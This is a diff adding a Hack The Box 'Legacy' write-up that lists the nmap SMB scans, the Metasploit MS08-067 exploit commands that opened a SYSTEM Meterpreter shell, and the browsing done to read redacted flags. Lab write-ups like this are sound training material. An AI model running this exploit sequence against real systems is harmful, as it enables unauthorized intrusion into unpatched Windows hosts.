@@ -1,0 +1,78 @@
+# 💥 Hack The Box – Legacy
+
+**IP:** 10.129.225.75  
+**OS:** Windows  
+**Difficulty:** Easy  
+**Status:** ✅ Rooted
+
+---
+
+## 🛠️ Workspace Setup
+
+```bash
+cd /tmp && mkdir legacy && cd legacy
+```
+
+---
+
+## 🔍 Full Port Scan + SMB Detection
+
+```bash
+nmap -sS -sV -sC -p- -T4 -Pn -oN fullscan.txt 10.129.225.75
+```
+
+→ Ports 139 and 445 open (SMB)
+
+```bash
+nmap --script=smb-vuln* -p 139,445 -T4 -Pn -oN smbscan.txt 10.129.225.75
+```
+
+→ Vulnerability detected: **MS08-067**
+
+---
+
+## 💣 Exploitation with Metasploit
+
+```bash
+sudo -i
+msfdb start
+msfconsole
+
+search MS08-067
+use exploit/windows/smb/ms08_067_netapi
+set LHOST tun0
+set RHOSTS 10.129.225.75
+run
+```
+
+→ Meterpreter shell opened
+
+---
+
+## 📦 Post-Exploitation (Windows Shell)
+
+```cmd
+sysinfo
+pwd
+
+cd C:\
+dir
+
+cd "Documents and Settings"
+dir
+
+cd john\Desktop
+type user.txt   # [REDACTED]
+
+cd ..\..\Administrator\Desktop
+type root.txt   # [REDACTED]
+```
+
+---
+
+## 🧾 Notes
+
+- 🎯 Vulnerability: MS08-067 (NetAPI)
+- ✅ Shell obtained as SYSTEM, no privilege escalation required
+- 🔐 Flags hidden for HTB compliance
+- 💡 Use of `nmap --script=smb-vuln*` confirms vulnerability before exploitation
